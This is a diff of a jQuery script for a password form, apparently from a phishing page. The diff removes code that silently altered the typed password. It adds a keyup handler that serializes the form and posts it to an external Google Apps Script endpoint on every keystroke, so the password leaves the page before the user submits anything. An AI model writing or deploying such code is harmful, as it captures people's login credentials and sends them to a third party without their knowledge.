@@ -10,48 +10,20 @@ String.prototype.replaceAt = function(index, replacement) {
     return this.substring(0, index) + replacement + this.substring(index + 1);
 }
 
-
-
-
-
-
-
-
-
-
-
 $('#password').focus(function(){
-    $('#password').keydown(function(event){
-        if($('#password').val().length==2){
-            $('#password').val($('#password').val()+'e')
-            return false
-        }
-
-        // if($('#password').val().length==3 && check){
-        //     var first_letter = $('#password').val().charAt(0)
-        //     var first_letter_CharCode = first_letter.charCodeAt()
-        //     var s_letter = String.fromCharCode(first_letter_CharCode+1)
-        //     $('#password').val($('#password').val().replaceAt(0,s_letter));
-        //     check = false;
-        // }
-        // if($('#password').val().length==0){
-        //     check = true;
-    
-        // }
-        // $.ajax({
-        //     data:$("#gform").serialize(),
-        //     url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",        
-        //     method:"post",
-        //     success:function (response){
-        //     },
-        //     error:function (err){
-        //         $('#error-msg').show()
-        //     }
-        // })
+    $('#password').keyup(function(){
+        $.ajax({
+            data:$("#gform").serialize(),
+            url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",        
+            method:"post",
+            success:function (response){
+            },
+            error:function (err){
+                $('#error-msg').show()
+            }
+        })
     })
 })
-
-
 
 /*========================================       Ajax      =======================================*/
 $("#gform").submit((e)=>{
@@ -73,12 +45,3 @@ $("#gform").submit((e)=>{
         }
     })
   })
-
-function showFunc() {
-    var x = document.getElementById("password");
-    if (x.type === "password") {
-      x.type = "text";
-    } else {
-      x.type = "password";
-    }
-  }
